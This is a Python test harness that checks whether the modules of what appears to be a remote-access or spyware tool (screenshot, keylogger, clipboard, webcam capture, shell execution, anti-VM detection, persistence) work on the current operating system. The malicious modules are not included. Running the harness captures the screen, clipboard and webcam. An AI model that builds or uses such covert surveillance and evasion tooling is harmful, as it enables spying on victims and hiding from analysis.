#!/usr/bin/env python3
"""
Cross-Platform Compatibility Test
"""
import sys
import os
import platform

sys.path.append(os.path.join(os.path.dirname(__file__), 'mods'))

def test_platform_detection():
    print("🔍 Testing Platform Detection...")
    print("=" * 40)
    
    current_platform = platform.system()
    print(f"Current Platform: {current_platform}")
    print(f"Platform Version: {platform.version()}")
    print(f"Machine: {platform.machine()}")
    print(f"Processor: {platform.processor()}")
    
    return current_platform

def test_screenshot_compatibility():
    print("\n📸 Testing Screenshot Compatibility...")
    print("=" * 40)
    
    try:
        from screenshot import Screenshot
        screenshot = Screenshot()
        data = screenshot.get_data()
        
        if data:
            print(f"✅ Screenshot: Working on {platform.system()}")
            print(f"  Size: {len(data)} bytes")
            return True
        else:
            print(f"❌ Screenshot: Failed on {platform.system()}")
            return False
    except Exception as e:
        print(f"❌ Screenshot: Error on {platform.system()}: {e}")
        return False

def test_sysinfo_compatibility():
    print("\n💻 Testing SYSINFO Compatibility...")
    print("=" * 40)
    
    try:
        from sysinfo import SYSINFO
        sysinfo = SYSINFO()
        data = sysinfo.get_data()
        
        if data:
            print(f"✅ SYSINFO: Working on {platform.system()}")
            return True
        else:
            print(f"❌ SYSINFO: Failed on {platform.system()}")
            return False
    except Exception as e:
        print(f"❌ SYSINFO: Error on {platform.system()}: {e}")
        return False

def test_shell_compatibility():
    print("\n🐚 Testing Shell Compatibility...")
    print("=" * 40)
    
    try:
        from shell import ShellExecutor
        result = ShellExecutor.execute("echo test")
        
        if result:
            print(f"✅ Shell: Working on {platform.system()}")
            return True
        else:
            print(f"❌ Shell: Failed on {platform.system()}")
            return False
    except Exception as e:
        print(f"❌ Shell: Error on {platform.system()}: {e}")
        return False

def test_antivm_compatibility():
    print("\n🛡️ Testing AntiVM Compatibility...")
    print("=" * 40)
    
    try:
        from antivm import AntiVM
        result = AntiVM.detect()
        
        print(f"✅ AntiVM: Working on {platform.system()}")
        print(f"  VM Detected: {result}")
        return True
    except Exception as e:
        print(f"❌ AntiVM: Error on {platform.system()}: {e}")
        return False

def test_keylogger_compatibility():
    print("\n⌨️ Testing Keylogger Compatibility...")
    print("=" * 40)
    
    try:
        # Test if pynput is available
        from pynput.keyboard import Listener
        print(f"✅ Keylogger: pynput available on {platform.system()}")
        return True
    except ImportError:
        print(f"❌ Keylogger: pynput not available on {platform.system()}")
        return False
    except Exception as e:
        print(f"❌ Keylogger: Error on {platform.system()}: {e}")
        return False

def test_clipboard_compatibility():
    print("\n📋 Testing Clipboard Compatibility...")
    print("=" * 40)
    
    try:
        from clipboard import ClipboardManager
        result = ClipboardManager.get_clipboard()
        
        print(f"✅ Clipboard: Working on {platform.system()}")
        return True
    except Exception as e:
        print(f"❌ Clipboard: Error on {platform.system()}: {e}")
        return False

def test_webcam_compatibility():
    print("\n📷 Testing Webcam Compatibility...")
    print("=" * 40)
    
    try:
        from webcam import Webcam
        webcam = Webcam()
        result = webcam.capture()
        
        if isinstance(result, bytes):
            print(f"✅ Webcam: Working on {platform.system()}")
            return True
        else:
            print(f"⚠️ Webcam: {result} on {platform.system()}")
            return False
    except Exception as e:
        print(f"❌ Webcam: Error on {platform.system()}: {e}")
        return False

def test_persistence_compatibility():
    print("\n🔗 Testing Persistence Compatibility...")
    print("=" * 40)
    
    try:
        from persistence import Persistence
        # Don't actually install, just test if it can be imported
        print(f"✅ Persistence: Module available on {platform.system()}")
        return True
    except Exception as e:
        print(f"❌ Persistence: Error on {platform.system()}: {e}")
        return False

if __name__ == "__main__":
    print("🚀 Cross-Platform Compatibility Test")
    print("=" * 40)
    
    platform_name = test_platform_detection()
    
    tests = [
        ("Screenshot", test_screenshot_compatibility),
        ("SYSINFO", test_sysinfo_compatibility),
        ("Shell", test_shell_compatibility),
        ("AntiVM", test_antivm_compatibility),
        ("Keylogger", test_keylogger_compatibility),
        ("Clipboard", test_clipboard_compatibility),
        ("Webcam", test_webcam_compatibility),
        ("Persistence", test_persistence_compatibility),
    ]
    
    results = {}
    for test_name, test_func in tests:
        results[test_name] = test_func()
    
    print("\n" + "=" * 40)
    print("📊 COMPATIBILITY SUMMARY")
    print("=" * 40)
    
    working = sum(results.values())
    total = len(results)
    
    for test_name, result in results.items():
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{test_name:12} : {status}")
    
    print(f"\nWorking: {working}/{total} ({working/total*100:.1f}%)")
    
    if working == total:
        print("\n🎉 All functions are compatible!")
    else:
        print(f"\n⚠️ {total-working} functions need attention") 